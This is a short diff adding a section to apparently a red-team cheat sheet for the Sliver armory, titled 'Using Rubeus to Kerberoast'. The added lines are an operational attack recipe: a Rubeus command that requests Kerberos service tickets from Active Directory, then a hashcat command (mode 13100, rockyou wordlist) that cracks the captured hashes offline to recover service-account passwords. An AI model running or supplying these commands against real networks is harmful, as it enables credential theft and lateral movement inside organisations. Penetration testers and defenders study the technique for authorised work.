@@ -19,3 +19,11 @@ armory
 
 armory install c2tc-domaininfo
 ```
+
+Using Rubeus to Kerberoast
+```bash
+rubeus -i kerberoast /nowrap
+
+#Capture hash offline and crack
+hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt
+```
